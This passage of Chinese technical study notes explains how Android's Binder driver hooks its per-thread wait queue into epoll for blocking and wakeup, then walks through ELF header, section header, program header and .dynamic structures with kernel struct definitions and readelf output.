驱动的事件（例如新事务到来）就能够通过唤醒该等待队列来通知到 epoll。</p>\n<p>epoll 文件描述符与 Binder 驱动的挂钩初始化</p>\n<p>Binder 文件描述符与 epoll 的“挂钩”主要体现在 Binder 驱动初始化和线程初始化两个层面：<br>    •    打开 Binder 设备 (binder_open)：当进程打开 /dev/binder 时，Binder 驱动会创建并初始化一个 binder_proc 结构表示该进程，并将其指针存储在文件结构的 private_data 字段中 ￼。这个 binder_proc 包含该进程的 Binder 全局状态（如进程任务队列、线程红黑树等）。binder_open 只是初始化 binder_proc，并未产生具体线程等待队列。<br>    •    创建 Binder 线程 (binder_get_thread)：线程真正与 Binder 驱动挂钩发生在执行 binder 操作时，比如上文提到的 binder_poll 调用或 ioctl(BINDER_WRITE_READ) 时。binder_get_thread(proc) 函数在需要时分配 binder_thread 结构，将其加入 proc-&gt;threads 红黑树，并进行初始化 ￼。初始化过程中，特别重要的是 init_waitqueue_head(&amp;thread-&gt;wait) ￼——这为该线程创建了一个内核等待队列头，用于后续阻塞和唤醒。还设置了 thread-&gt;pid、thread-&gt;task 等信息，并将新线程节点插入 proc-&gt;threads 结构中 ￼。可以认为，这一步将 Binder 驱动和具体线程关联起来，为该线程准备好了等待队列等同步机制。<br>    •    epoll 挂钩 Binder 等待队列：在线程已存在且调用 binder_poll 时，Binder 驱动通过 poll_wait 提供了 thread-&gt;wait 给 epoll，epoll 随即将自己的等待项附加上去（见前节） ￼。从这一刻开始，Binder 的等待队列与 epoll 完成挂钩：epoll 文件描述符内部维护了指向 Binder 等待队列的引用，并依赖它来实现事件通知。</p>\n<p>经过上述初始化，Binder 驱动已经为 epoll 使用做好准备：Binder端有了特定线程的等待队列，epoll端也在该等待队列上注册了监听者。需要注意的是，如果Binder线程未通过 BC_REGISTER_LOOPER 等命令正式注册为Binder线程，也可以使用epoll机制等待Binder事件。但Binder驱动只有在线程标记了 BINDER_LOOPER_STATE_POLL（例如通过 binder_poll 设置）或进入等待状态时，才会将事务分发给它 ￼ ￼。因此通常在使用epoll前，会调用一次 binder_poll 或 BC_ENTER_LOOPER 等使线程登记到Binder驱动，确保Binder知道此线程存在并可被唤醒处理事务 ￼。</p>\n<p>线程等待 Binder 事件的阻塞过程</p>\n<p>在完成 epoll 注册后，用户空间线程会调用 epoll_wait 来等待事件，此时如果 Binder 没有立即可用的事件，线程将进入休眠阻塞等待。阻塞等待的实现机制如下：<br>    •    epoll_wait 侧的阻塞：当 epoll_wait 被调用且当前没有任何就绪事件时，内核会将调用线程置于睡眠状态，并挂在所有关联等待队列上。其中就包括 Binder 线程的 wait 队列。由于先前 poll_wait 已将 epoll 的等待节点添加到 binder_thread-&gt;wait，调用线程现在实际上受控于这个等待队列：如果 thread-&gt;wait 上触发唤醒，epoll_wait 就会被唤醒 ￼ ￼。换句话说，Binder 的等待队列是 epoll_wait 能否继续的决定因素之一。调用线程会一直阻塞，直到 Binder 有新事务/数据（或其他监视的文件描述符有事件）将其唤醒，或者直到超时/信号发生。<br>    •    Binder 内阻塞机制（对比）：值得对比的是，不使用 epoll 时，Binder 线程通常调用 ioctl(BINDER_WRITE_READ) 进入驱动读取流程，内部会调用 binder_wait_for_work() 阻塞等待 ￼。binder_wait_for_work 使用 prepare_to_wait(&amp;thread-&gt;wait, &amp;wait, TASK_INTERRUPTIBLE) 将当前线程挂到 thread-&gt;wait 队列，并调用 schedule() 休眠 ￼。如果有信号或被唤醒则跳出循环 ￼。可以看到，无论是 epoll 方式还是直接 ioctl 阻塞，本质上线程都睡在 binder_thread-&gt;wait 等待队列上。区别在于：epoll 情况下由 epoll 子系统管理休眠和唤醒；直接阻塞情况下由 Binder 驱动自身通过 schedule() 使线程睡眠。</p>\n<p>因此，在等待过程中，Binder 驱动扮演被动角色——线程要么通过 binder_wait_for_work 主动睡眠（传统模式），要么通过 epoll 机制间接睡眠。但无论哪种模式，线程阻塞的核心是在 binder_thread-&gt;wait 等待队列上挂起。当该等待队列收到唤醒信号时，线程将被调度恢复运行，开始处理 Binder 事务或返回 epoll 结果。</p>\n<p>Binder 事务到来后的唤醒机制</p>\n<p>当Binder驱动中有新的事务或事件到来时，必须唤醒在等待该事件的线程。Binder内核通过在适当时机调用等待队列唤醒函数来实现这一点。结合 epoll 的情况，唤醒机制包括以下几种路径：<br>    •    直接唤醒特定线程：如果Binder检测到有目标线程正阻塞等待（非epoll模式下在waiting_threads列表中），驱动会选取相应线程并唤醒。典型情况是在有事务投递给特定进程时，Binder调用 binder_select_thread_ilocked(proc) 从等待线程列表挑选一个空闲线程 ￼，然后调用 binder_wakeup_thread_ilocked(proc, thread, sync=false) 唤醒它 ￼。在 binder_wakeup_thread_ilocked 内，如果传入了特定 thread，则直接执行 wake_up_interruptible(&amp;thread-&gt;wait)（或其同步版本）将该线程从 thread-&gt;wait 队列上唤醒 ￼。这会解除线程的阻塞，无论线程是通过 binder_wait_for_work 睡眠还是通过 epoll 间接睡眠，都将被激活准备处理 Binder 事务。<br>    •    唤醒使用 epoll 的线程：如果目标进程中没有传统阻塞等待的线程（或所有线程都忙于事务），但有线程处于 epoll 监听状态（即 BINDER_LOOPER_STATE_POLL 标记的线程），Binder 驱动会尝试唤醒它们。具体地，binder_wakeup_thread_ilocked(proc, thread=NULL, sync=false) 处理了这种情况：当未指定特定线程时，它会调用 binder_wakeup_poll_threads_ilocked(proc, sync) ￼。该函数遍历该进程的所有线程节点，如果线程的 looper 状态包含 BINDER_LOOPER_STATE_POLL 且线程空闲可处理新的事务（通过 binder_available_for_proc_work_ilocked 判断），则执行 wake_up_interruptible(&amp;thread-&gt;wait) 将其唤醒 ￼。由于 epoll 的等待节点挂在这些线程的等待队列上，wake_up_interruptible 不仅会唤醒可能休眠的Binder线程（如果其正通过binder_wait_for_work阻塞），也会触发epoll注册的回调。对于通过epoll_wait等待的线程来说，这相当于内核调用了 epoll 的 ep_poll_callback，将Binder文件描述符标记为就绪并唤醒正在epoll_wait的线程 ￼ ￼。换句话说，Binder驱动对 thread-&gt;wait 的唤醒会通知到epoll机制，促使在epoll_wait中休眠的线程被唤醒并察觉Binder fd变为可读。<br>    •    线程退出和清理：当Binder线程退出或进程关闭Binder fd时，也需要唤醒等待队列以通知epoll机制解除关联。历史上，由于Binder线程结构可能提前释放，而epoll仍持有其等待队列指针，这曾导致UAF漏洞 ￼。为了解决此问题，新版内核在线程释放时使用 wake_up_poll(&amp;thread-&gt;wait, EPOLLHUP | POLLFREE) 来专门唤醒等待队列并通知epoll清理 ￼。代码中检查了如果线程标记了 POLL 状态且等待队列上有等待者，就调用 wake_up_poll 发出带有 EPOLLHUP|POLLFREE 标志的唤醒 ￼。epoll 收到 POLLFREE 后会从其内部链表中移除对应的等待队列项，防止再次访问已经释放的 Binder 等待队列 ￼。这一机制确保资源安全回收。</p>\n<p>综上，Binder 事务到来时，内核会根据线程状态选择适当方式唤醒：对于直接阻塞等待的线程，通过 wake_up_interruptible 直接唤醒 ￼；对于通过 epoll 等待的线程，通过同样的等待队列唤醒机制激活 epoll 回调 ￼。所有这些唤醒最终都作用于 binder_thread-&gt;wait 等待队列，实现了 Binder 驱动与 epoll 等待机制的联动。唤醒发生的位置散布于 Binder 驱动不同函数中，例如新事务入队时的 binder_wakeup_proc_ilocked -&gt; binder_wakeup_thread_ilocked 调用，或线程退出时的 binder_thread_release 调用 ￼。核心点在于：每当 Binder 有新工作可处理，就会调用 wake_up…(&amp;thread-&gt;wait) 将相关等待线程（无论直接等待还是epoll等待）唤醒。</p>\n<p>epoll 与 binder_thread 结构中 wait 字段的结合使用</p>\n<p>Binder 驱动的 binder_thread 结构中包含一个 wait 字段，其类型为 wait_queue_head_t，这是 Linux 内核等待队列的头部类型 ￼ ￼。这个等待队列在 Binder 通信中扮演了举足轻重的角色，也是 epoll 能够与 Binder 集成的关键所在。其结合使用方式总结如下：<br>    •    Binder_thread.wait 的初始化和作用：每当有线程与 Binder 驱动交互（例如通过 binder_open 后第一次执行 binder 操作），Binder 内核会确保为该线程分配 binder_thread 并初始化其 wait 队列 ￼。该等待队列用于挂载所有等待此线程Binder事件的等待者。对普通Binder线程而言，wait 队列用于实现阻塞读取：线程在没有事务时在此队列睡眠，直到有事务时被唤醒 ￼。对使用epoll的线程而言，wait 队列同样是休眠挂钩点，只是由epoll代为管理休眠/唤醒。<br>    •    epoll 将自身等待项挂接到 wait 队列：正如前文所述，当调用 binder_poll 时，内核通过 poll_wait 将epoll的等待项注册到 binder_thread.wait 队列 ￼ ￼。从那一刻起，Binder线程的等待队列同时服务于两种等待者：Binder自有的等待（如果线程也可能调用binder_wait_for_work阻塞）以及epoll的等待者。binder_thread.wait 成为了连接Binder驱动和epoll机制的纽带 ￼。值得注意的是，Binder线程即使没有直接阻塞在Binder驱动上，只要epoll在等待，同样是通过这个wait队列来感知事件的 ￼。<br>    •    通过 wait 队列进行事件传递：当Binder进程收到新事务、回复或其他可读事件时，Binder驱动对目标线程的 wait 队列调用唤醒函数（如 wake_up_interruptible） ￼。由于epoll的等待节点在该队列上，这个唤醒会调用epoll的回调，将事件标记为就绪并唤醒在epoll_wait休眠的线程 ￼。与此同时，如果线程本身也在该等待队列睡眠（Binder传统阻塞模式），也会被直接唤醒执行。例如，Binder驱动的事务分发代码中，一旦将事务加入目标线程/进程的队列，立即调用 binder_wakeup_proc_ilocked，进而触发对 thread-&gt;wait 的唤醒 ￼ ￼。<br>    •    生命周期管理：因为 epoll 持续持有对 binder_thread.wait 的引用，所以 Binder 驱动在线程终止时也通过该等待队列与 epoll 通信（使用 wake_up_poll(…, POLLFREE)）通知epoll清理 ￼。正常情况下，只要 Binder 文件描述符不关闭，binder_thread.wait 的生命周期与 Binder 文件一致，epoll 挂载在其上也是安全的 ￼。Binder 驱动的新版本通过 POLLFREE 机制消除了使用 epoll 可能导致的生命周期问题，确保在 binder_thread 释放前将等待队列上的 epoll 引用移除 ￼。</p>\n<p>总的来说，binder_thread 结构中的 wait 字段充当了 Binder 驱动与 epoll 的桥梁：Binder 利用它来挂起/唤醒等待事务的线程，epoll 利用它来监听 Binder 事件的发生。一边是 Binder 内核通过 wait_queue_head_t 实现同步和通知 ￼，另一边是 epoll 通过在该等待队列注册回调实现事件驱动 ￼。两者的结合，使得 Binder 机制可以无缝集成到 Linux 通用的 IO 多路复用框架中。这不仅提高了灵活性，也使 Android 主线程等可以采用统一的 epoll 循环来监听 Binder 和其它事件，从架构上提高了效率和可维护性。通过上述机制，Binder 驱动成功地支持了 epoll 的监视，达到了预期的应用场景和目的。</p>\n<p><strong>参考资料：</strong>Binder 驱动源码 ￼ ￼；Android Binder线程模型分析 ￼ ￼；CVE-2019-2215 漏洞相关代码解读 ￼ ￼等。</p>\n"},{"_content":"elf解析：\n链接视图\nsection header table\n\n运行视图\nprograme header table\n\n为什么要有运行视图\n1. 相同权限的section 放在一起\n2. 如果用section 来加载到内存中，如果这个节的大小为1025KB,内存分页的大小为1024KB,那么多出的1KB空间，需要另外申请一个页，浪费内存\n\n\n```cpp\n/* 32-bit ELF base types. */\ntypedef __u32\tElf32_Addr;\ntypedef __u16\tElf32_Half;\ntypedef __u32\tElf32_Off;\ntypedef __s32\tElf32_Sword;\ntypedef __u32\tElf32_Word;\n\n/* 64-bit ELF base types. */\ntypedef __u64\tElf64_Addr;\ntypedef __u16\tElf64_Half;\ntypedef __s16\tElf64_SHalf;\ntypedef __u64\tElf64_Off;\ntypedef __s32\tElf64_Sword;\ntypedef __u32\tElf64_Word;\ntypedef __u64\tElf64_Xword;\ntypedef __s64\tElf64_Sxword;\n\n```\n\n以下为定义的文件头：\n![alt text](../pic/elf_header.png)\n\n```cpp\ninclude/uapi/linux/elf.h\n\n#define EI_NIDENT\t16\n\ntypedef struct elf32_hdr {\n  unsigned char\te_ident[EI_NIDENT]; //16字节的魔数等\n  Elf32_Half\te_type; //文件类型\n  Elf32_Half\te_machine; //需要的体系结构\n  Elf32_Word\te_version; //版本\n  Elf32_Addr\te_entry;  /* Entry point */\n  Elf32_Off\te_phoff;\n  Elf32_Off\te_shoff;\n  Elf32_Word\te_flags;\n  Elf32_Half\te_ehsize; // 表示ELF header 大小 2字节\n  Elf32_Half\te_phentsize; // 表示program header table 每个条目的大小\n  Elf32_Half\te_phnum; // 表示program header table 包含的条目数\n  Elf32_Half\te_shentsize; // 表示section header table 每个条目的大小\n  Elf32_Half\te_shnum;    // 表示section header table 包含的条目数\n  Elf32_Half\te_shstrndx; //包含section 名称的字符串是第几个\n} Elf32_Ehdr;\n\ntypedef struct elf64_hdr {\n  unsigned char\te_ident[EI_NIDENT];\t/* ELF \"magic number\" */\n  Elf64_Half e_type;\n  Elf64_Half e_machine;\n  Elf64_Word e_version;\n  Elf64_Addr e_entry;\t\t/* Entry point virtual address */\n  Elf64_Off e_phoff;\t\t/* Program header table file offset */\n  Elf64_Off e_shoff;\t\t/* Section header table file offset */\n  Elf64_Word e_flags;\n  Elf64_Half e_ehsize;\n  Elf64_Half e_phentsize;\n  Elf64_Half e_phnum;\n  Elf64_Half e_shentsize;\n  Elf64_Half e_shnum;\n  Elf64_Half e_shstrndx;\n} Elf64_Ehdr;\n\n```\nreadelf -h file.so\n```r\nELF Header:\n  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00\n  Class:                             ELF32\n  Data:                              2's complement, little endian\n  Version:                           1 (current)\n  OS/ABI:                            UNIX - System V\n  ABI Version:                       0\n  Type:                              DYN (Shared object file)\n  Machine:                           ARM\n  Version:                           0x1\n  Entry point address:               0x0\n  Start of program headers:          52 (bytes into file)\n  Start of section headers:          12892 (bytes into file)\n  Flags:                             0x5000200, Version5 EABI, soft-float ABI\n  Size of this header:               52 (bytes)\n  Size of program headers:           32 (bytes)\n  Number of program headers:         8\n  Size of section headers:           40 (bytes)\n  Number of section headers:         27\n  Section header string table index: 26\n```\n\n链接视图：\nSHT(section header table)\nSHT是程序编译链接之后按照功能逻辑组织代码数据的方式，sht位于elf文件的最后\n源码编译后生成的不同性质的数据会分门别列的放置，因此出现代码段，数据段，符号段\n![alt text](../pic/code_sht.JPG)\n\n![alt text](../pic/sht.png)\n```cpp\n/* sh_type */\n#define SHT_NULL\t0\n#define SHT_PROGBITS\t1\n#define SHT_SYMTAB\t2\n#define SHT_STRTAB\t3\n#define SHT_RELA\t4\n#define SHT_HASH\t5\n#define SHT_DYNAMIC\t6\n#define SHT_NOTE\t7\n#define SHT_NOBITS\t8\n#define SHT_REL\t\t9\n#define SHT_SHLIB\t10\n#define SHT_DYNSYM\t11\n#define SHT_NUM\t\t12\n#define SHT_LOPROC\t0x70000000\n#define SHT_HIPROC\t0x7fffffff\n#define SHT_LOUSER\t0x80000000\n#define SHT_HIUSER\t0xffffffff\n\n/* sh_flags */\n#define SHF_WRITE\t\t0x1\n#define SHF_ALLOC\t\t0x2\n#define SHF_EXECINSTR\t\t0x4\n#define SHF_RELA_LIVEPATCH\t0x00100000\n#define SHF_RO_AFTER_INIT\t0x00200000\n#define SHF_MASKPROC\t\t0xf0000000\n\n/* special section indexes */\n#define SHN_UNDEF\t0\n#define SHN_LORESERVE\t0xff00\n#define SHN_LOPROC\t0xff00\n#define SHN_HIPROC\t0xff1f\n#define SHN_LIVEPATCH\t0xff20\n#define SHN_ABS\t\t0xfff1\n#define SHN_COMMON\t0xfff2\n#define SHN_HIRESERVE\t0xffff\n \ntypedef struct elf32_shdr {\n  Elf32_Word\tsh_name; //节名\n  Elf32_Word\tsh_type; //节类型\n  Elf32_Word\tsh_flags; //节标志位\n  Elf32_Addr\tsh_addr;  //虚拟地址\n  Elf32_Off\tsh_offset; //文件偏移地址\n  Elf32_Word\tsh_size; //节大小\n  Elf32_Word\tsh_link; \n  Elf32_Word\tsh_info;\n  Elf32_Word\tsh_addralign; //对齐偏移\n  Elf32_Word\tsh_entsize; \n} Elf32_Shdr;\n\ntypedef struct elf64_shdr {\n  Elf64_Word sh_name;\t\t/* Section name, index in string tbl */\n  Elf64_Word sh_type;\t\t/* Type of section */\n  Elf64_Xword sh_flags;\t\t/* Miscellaneous section attributes */\n  Elf64_Addr sh_addr;\t\t/* Section virtual addr at execution */\n  Elf64_Off sh_offset;\t\t/* Section file offset */\n  Elf64_Xword sh_size;\t\t/* Size of section in bytes */\n  Elf64_Word sh_link;\t\t/* Index of another section */\n  Elf64_Word sh_info;\t\t/* Additional section information */\n  Elf64_Xword sh_addralign;\t/* Section alignment */\n  Elf64_Xword sh_entsize;\t/* Entry size if section holds table */\n} Elf64_Shdr;\n    \n```\n在 ELF 文件中，`shdr` 是 `Section Header` 的缩写，表示段头表（Section Header Table）中的一项。段头表描述了 ELF 文件中各个段的基本信息，帮助系统在加载或链接时正确处理各个段。\n\n让我们逐一解释 `Elf64_Shdr` 结构体中的各个字段：\n\n1. **`sh_name` (Section name, index in string table)**：\n   - 类型：`Elf64_Word`（32位无符号整数）\n   - 解释：这是一个指向字符串表的索引，字符串表保存了段的名称。通过该索引，可以找到对应的段名称。\n\t在段头表中的 sh_name 字段记录了一个索引值。\n\t该索引值对应于 .shstrtab 段中的偏移量。\n\t在 .shstrtab 段中，从该偏移量开始的字符串就是该段的名称。\n\n2. **`sh_type` (Type of section)**：\n   - 类型：`Elf64_Word`（32位无符号整数）\n   - 解释：该字段表示段的类型，常见的类型有：\n     - `SHT_NULL`：空段\n     - `SHT_PROGBITS`：程序数据段\n     - `SHT_SYMTAB`：符号表段\n     - `SHT_STRTAB`：字符串表段\n     - `SHT_RELA`：带重定位的符号段等\n\n3. **`sh_flags` (Miscellaneous section attributes)**：\n   - 类型：`Elf64_Xword`（64位无符号整数）\n   - 解释：段的属性标志，可能的标志有：\n     - `SHF_WRITE`：段包含可写数据\n     - `SHF_ALLOC`：段需要被加载到内存中\n     - `SHF_EXECINSTR`：段包含可执行指令\n\n4. **`sh_addr` (Section virtual addr at execution)**：\n   - 类型：`Elf64_Addr`（64位无符号整数）\n   - 解释：段在内存中的虚拟地址。如果段需要被加载到内存中（如代码段或数据段），该地址表示它在进程地址空间中的位置。对于非加载段，这个值为 0。\n\n5. **`sh_offset` (Section file offset)**：\n   - 类型：`Elf64_Off`（64位无符号整数）\n   - 解释：段在文件中的偏移量，指明该段数据从文件的哪个位置开始。\n\n6. **`sh_size` (Size of section in bytes)**：\n   - 类型：`Elf64_Xword`（64位无符号整数）\n   - 解释：段的大小，以字节为单位。\n\n7. **`sh_link` (Index of another section)**：\n   - 类型：`Elf64_Word`（32位无符号整数）\n   - 解释：此字段与段的类型相关。对于符号表，它通常是关联字符串表的索引；对于重定位段，它可能是关联符号表的索引。\n\n8. **`sh_info` (Additional section information)**：\n   - 类型：`Elf64_Word`（32位无符号整数）\n   - 解释：该字段也与段类型相关。例如，对于符号表，它表示局部符号的起始索引；对于重定位段，它可能是相关节的索引。\n\n9. **`sh_addralign` (Section alignment)**：\n   - 类型：`Elf64_Xword`（64位无符号整数）\n   - 解释：段的对齐要求。段必须按此对齐方式在内存中对齐。如果对齐值为 0 或 1，则表示没有特殊对齐要求。\n\n10. **`sh_entsize` (Entry size if section holds table)**：\n    - 类型：`Elf64_Xword`（64位无符号整数）\n    - 解释：如果段包含一个表（如符号表或重定位表），此字段指明每个表项的大小。如果段不是表，则此字段为 0。\n\n这些字段共同描述了每个段的基本属性，使操作系统或链接器能够正确处理 ELF 文件中的各个段。\n\n\n连接器相关的 .dynamic section\n\n**`.dynamic` 段** 在 ELF 文件中是一个非常重要的段，它用于描述可执行文件或共享对象文件在运行时与动态链接器之间的互动。它包含了与动态链接相关的各种信息，比如所依赖的共享库、全局偏移表（GOT）、符号表、重定位表等。\n\n`.dynamic` 段的内容是由一系列 `Elf64_Dyn` 结构体组成的。每个 `Elf64_Dyn` 结构体有两个成员，分别是 `d_tag` 和 `d_un`，其中 `d_tag` 指定了动态条目的类型，而 `d_un` 则包含相应的值或地址。\n\n`Elf64_Dyn` 结构体的定义如下：\n\n```c\ntypedef struct {\n    Elf64_Sxword d_tag;     /* Dynamic entry type */\n    union {\n        Elf64_Xword d_val;  /* Integer value */\n        Elf64_Addr d_ptr;   /* Program virtual address */\n    } d_un;\n} Elf64_Dyn;\n```\n\n### 详细介绍 `.dynamic` 段的常用标志（`d_tag` 字段）\n\n每个动态条目（entry）的 `d_tag` 字段表示该条目的类型，`d_un` 存储的值可能是一个整数（`d_val`）或者是一个虚拟地址（`d_ptr`）。以下是 `.dynamic` 段中常用的标志及其含义：\n\n1. **`DT_NEEDED`**\n   - 解释：指向依赖的共享库名称的字符串表索引。每个 `DT_NEEDED` 条目指定了一个程序运行时所需的共享库。\n   - 类型：`d_un.d_val` 指向字符串表中的索引。\n\n2. **`DT_PLTRELSZ`**\n   - 解释：`.rel.plt` 或 `.rela.plt` 段的大小，即重定位表的大小，主要用于跳转表（PLT）。\n   - 类型：`d_un.d_val` 是段的大小（以字节为单位）。\n\n3. **`DT_PLTGOT`**\n   - 解释：全局偏移表（Global Offset Table, GOT）的地址。GOT 是用于处理动态符号解析的一个数据结构。\n   - 类型：`d_un.d_ptr` 是 GOT 段的虚拟地址。\n\n4. **`DT_HASH`**\n   - 解释：指向符号哈希表的地址。用于符号查找加速。\n   - 类型：`d_un.d_ptr` 是哈希表的虚拟地址。\n\n5. **`DT_STRTAB`**\n   - 解释：指向字符串表的地址。字符串表保存符号名、库名等。\n   - 类型：`d_un.d_ptr` 是字符串表的虚拟地址。\n\n6. **`DT_SYMTAB`**\n   - 解释：指向符号表的地址。符号表保存了符号（如函数、变量）的地址和类型信息。\n   - 类型：`d_un.d_ptr` 是符号表的虚拟地址。\n\n7. **`DT_RELA`**\n   - 解释：指向带加法重定位表（`.rela` 段）的地址。\n   - 类型：`d_un.d_ptr` 是 `.rela` 重定位表的虚拟地址。\n\n8. **`DT_RELASZ`**\n   - 解释：`.rela` 段的大小（以字节为单位）。\n   - 类型：`d_un.d_val` 是段的大小。\n\n9. **`DT_STRSZ`**\n   - 解释：字符串表的大小（以字节为单位）。\n   - 类型：`d_un.d_val` 是字符串表的大小。\n\n10. **`DT_SYMENT`**\n    - 解释：符号表中每个条目的大小（以字节为单位）。\n    - 类型：`d_un.d_val` 是符号表条目的大小。\n\n11. **`DT_INIT`**\n    - 解释：程序或共享库初始化函数的地址。当程序启动或共享库被加载时，该函数会被调用。\n    - 类型：`d_un.d_ptr` 是初始化函数的地址。\n\n12. **`DT_FINI`**\n    - 解释：程序或共享库的终止函数的地址。当程序退出或共享库被卸载时，该函数会被调用。\n    - 类型：`d_un.d_ptr` 是终止函数的地址。\n\n13. **`DT_REL`**\n    - 解释：指向不带加法重定位表（`.rel` 段）的地址。\n    - 类型：`d_un.d_ptr` 是 `.rel` 段的虚拟地址。\n\n14. **`DT_RELSZ`**\n    - 解释：`.rel` 段的大小（以字节为单位）。\n    - 类型：`d_un.d_val` 是 `.rel` 段的大小。\n\n15. **`DT_JMPREL`**\n    - 解释：指向 `.rel.plt` 或 `.rela.plt` 段中的跳转表的重定位条目的地址。\n    - 类型：`d_un.d_ptr` 是 `.rel.plt` 或 `.rela.plt` 段的虚拟地址。\n\n16. **`DT_BIND_NOW`**\n    - 解释：指示动态链接器立即解析所有符号，而不是按需解析。这通常用于提高运行时性能。\n    - 类型：此标志仅用作指示（无关联值）。\n\n17. **`DT_DEBUG`**\n    - 解释：用于调试信息，动态链接器可以将一些调试相关信息放入此字段。\n    - 类型：`d_un.d_ptr` 是指向调试信息结构的虚拟地址。\n\n18. **`DT_FLAGS`**\n    - 解释：用于表示一些与动态链接相关的标志。常见标志包括：\n        - `DF_ORIGIN`：允许使用 `$ORIGIN` 来解析动态库路径。\n        - `DF_SYMBOLIC`：优先使用定义在可执行文件中的符号，而非动态库中的符号。\n        - `DF_TEXTREL`：允许对只读段进行重定位（通常意味着不安全的代码）。\n        - `DF_BIND_NOW`：所有符号都应立即绑定，而不是延迟到运行时。\n\n19. **`DT_RUNPATH`**\n    - 解释：运行时库搜索路径的地址。它提供了一个库搜索路径，动态链接器将在这个路径中查找所需的共享库。\n    - 类型：`d_un.d_ptr` 是运行时路径字符串的地址。\n\n20. **`DT_SONAME`**\n    - 解释：共享库的名字。动态链接器会使用这个名字来查找库文件。\n    - 类型：`d_un.d_val` 是字符串表中的索引，指向共享库名。\n\n21. **`DT_RPATH`**\n    - 解释：指定库搜索路径，类似于 `DT_RUNPATH`，但优先级不同。`RPATH` 通常在老版本中使用，`RUNPATH` 更现代。\n    - 类型：`d_un.d_ptr` 是运行时库路径字符串的地址。\n\n### 总结\n\n`.dynamic` 段是 ELF 文件中用于动态链接的核心结构，它包含了动态链接器在加载时所需的各种信息。每个 `d_tag` 对应不同类型的动态条目，链接器通过这些条目来处理库依赖、符号解析、重定位等工作。\n\n```r\nThere are 27 section headers, starting at offset 0x325c:\n\nSection Headers:\n  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al\n  [ 0]                   NULL            00000000 000000 000000 00      0   0  0\n  [ 1] .note.androi[...] NOTE            00000134 000134 000098 00   A  0   0  4\n  [ 2] .note.gnu.bu[...] NOTE            000001cc 0001cc 000024 00   A  0   0  4\n  [ 3] .dynsym           DYNSYM          000001f0 0001f0 0001c0 10   A  4   1  4\n  [ 4] .dynstr           STRTAB          000003b0 0003b0 00018e 00   A  0   0  1\n  [ 5] .gnu.hash         GNU_HASH        00000540 000540 000060 04   A  3   0  4\n  [ 6] .hash             HASH            000005a0 0005a0 0000bc 04   A  3   0  4\n  [ 7] .gnu.version      VERSYM          0000065c 00065c 000038 02   A  3   0  2\n  [ 8] .gnu.version_d    VERDEF          00000694 000694 00001c 00   A  4   1  4\n  [ 9] .gnu.version_r    VERNEED         000006b0 0006b0 000040 00   A  4   2  4\n  [10] .rel.dyn          REL             000006f0 0006f0 000178 08   A  3   0  4\n  [11] .rel.plt          REL             00000868 000868 000080 08  AI  3  20  4\n  [12] .plt              PROGBITS        000008e8 0008e8 0000d4 00  AX  0   0  4\n  [13] .text             PROGBITS        000009bc 0009bc 001750 00  AX  0   0  4\n  [14] .ARM.exidx        ARM_EXIDX       0000210c 00210c 0001a8 08  AL 13   0  4\n  [15] .ARM.extab        PROGBITS        000022b4 0022b4 000198 00   A  0   0  4\n  [16] .rodata           PROGBITS        0000244c 00244c 0005fc 01 AMS  0   0  1\n  [17] .data.rel.ro      PROGBITS        00003e28 002e28 00004c 00  WA  0   0  4\n  [18] .fini_array       FINI_ARRAY      00003e74 002e74 000008 04  WA  0   0  4\n  [19] .dynamic          DYNAMIC         00003e7c 002e7c 000110 08  WA  4   0  4\n  [20] .got              PROGBITS        00003f8c 002f8c 000074 00  WA  0   0  4\n  [21] .data             PROGBITS        00004000 003000 000048 00  WA  0   0  4\n  [22] .bss              NOBITS          00004048 003048 000001 00  WA  0   0  1\n  [23] .comment          PROGBITS        00000000 003048 0000b6 01  MS  0   0  1\n  [24] .note.gnu.go[...] NOTE            00000000 003100 00001c 00      0   0  4\n  [25] .ARM.attributes   ARM_ATTRIBUTES  00000000 00311c 00002e 00      0   0  1\n  [26] .shstrtab         STRTAB          00000000 00314a 00010f 00      0   0  1\nKey to Flags:\n  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),\n  L (link order), O (extra OS processing required), G (group), T (TLS),\n  C (compressed), x (unknown), o (OS specific), E (exclude),\n  D (mbind), y (purecode), p (processor specific)\n```\n各个节的解释：\nhttps://naotu.baidu.com/file/953beb87c9258f4111f4c105ed03c36e\n\n\n运行视图：\nPHT\nprogram header table\n其存在，使得操作系统加载程序时尽可能少的产生内存碎片，尽可能的提高内存使用率。\n\n![alt text](../pic/pht.png)\n\n```cpp\n/* These constants define the permissions on sections in the program\n   header, p_flags. */\n#define PF_R\t\t0x4\n#define PF_W\t\t0x2\n#define PF_X\t\t0x1\n\ntypedef struct elf32_phdr {\n  Elf32_Word\tp_type;\n  Elf32_Off\tp_offset;\n  Elf32_Addr\tp_vaddr;\n  Elf32_Addr\tp_paddr;\n  Elf32_Word\tp_filesz;\n  Elf32_Word\tp_memsz;\n  Elf32_Word\tp_flags;\n  Elf32_Word\tp_align;\n} Elf32_Phdr;\n\ntypedef struct elf64_phdr {\n  Elf64_Word p_type;\n  Elf64_Word p_flags;\n  Elf64_Off p_offset;\t\t/* Segment file offset */\n  Elf64_Addr p_vaddr;\t\t/* Segment virtual address */\n  Elf64_Addr p_paddr;\t\t/* Segment physical address */\n  Elf64_Xword p_filesz;\t\t/* Segment size in file */\n  Elf64_Xword p_memsz;\t\t/* Segment size in memory */\n  Elf64_Xword p_align;\t\t/* Segment alignment, file & memory */\n} Elf64_Phdr;\n```\n在 ELF 文件中，`phdr` 是 **Program Header**（程序头表）的缩写，描述了可执行文件或共享对象文件的段（segment）信息。与段头表（Section Header）不同，程序头表用于加载时描述如何在内存中布置文件的各个段。\n\n让我们逐一解释 `Elf64_Phdr` 结构体中的各个字段：\n\n1. **`p_type`** (Segment type):\n   - 类型：`Elf64_Word`（32位无符号整数）\n   - 解释：指明该段的类型，常见的值包括：\n     - `PT_NULL`：未使用的段\n     - `PT_LOAD`：可加载段\n     - `PT_DYNAMIC`：动态链接信息段\n     - `PT_INTERP`：包含解释器路径的段\n     - `PT_NOTE`：包含注释的段\n\n2. **`p_flags`** (Segment flags):\n   - 类型：`Elf64_Word`（32位无符号整数）\n   - 解释：段的权限标志，可能的标志包括：\n     - `PF_R`：可读段\n     - `PF_W`：可写段\n     - `PF_X`：可执行段\n   这些标志决定了段在内存中的访问权限。\n\n3. **`p_offset`** (Segment file offset):\n   - 类型：`Elf64_Off`（64位无符号整数）\n   - 解释：该段在文件中的偏移量，指明该段数据从文件的哪个位置开始。\n\n4. **`p_vaddr`** (Segment virtual address):\n   - 类型：`Elf64_Addr`（64位无符号整数）\n   - 